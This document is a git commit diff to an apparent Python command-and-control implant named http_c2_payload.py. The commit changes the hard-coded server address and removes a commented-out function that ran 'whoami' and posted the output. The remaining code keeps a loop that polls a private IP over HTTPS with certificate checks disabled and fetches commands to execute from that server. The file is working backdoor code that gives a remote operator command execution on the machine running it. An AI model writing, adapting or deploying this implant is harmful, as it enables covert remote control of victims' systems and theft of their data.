6e081452268ac580bf1ef2f52b10ce53cd653904
madhavbhatt <madhav.bhatt73@gmail.com>
2018-05-02 19:56:56 -0400

    payload

--- http_c2_payload.py
+++ http_c2_payload.py
@@ -1,22 +1,8 @@
 import os, ssl, time, http.client
 
-# http.client.HTTPConnection('172.16.69.132:4443', timeout=10) => HTTP communication
-
-"""
-def first_time():
-    try:
-        first_connection = http.client.HTTPSConnection('172.16.69.130:4443', timeout=10, context=ssl._create_unverified_context())
-        results = (os.popen(str("whoami")).read())
-        first_connection.request("POST", "", results)
-        first_connection.close()
-    except:
-        pass
-"""
-
-
 def callback():
     try:
-        c2_connection = http.client.HTTPSConnection('172.16.69.130:4443', timeout=10, context=ssl._create_unverified_context())
+        c2_connection = http.client.HTTPSConnection('172.16.69.132', timeout=10, context=ssl._create_unverified_context())
         c2_connection.request("GET", "/")
         cmd = c2_connection.getresponse().read().decode()
         if cmd:
@@ -25,10 +11,6 @@ def callback():
             c2_connection.close()
     except:
         pass
-
-
-# first_time()
-
 
 while 1:
     callback()
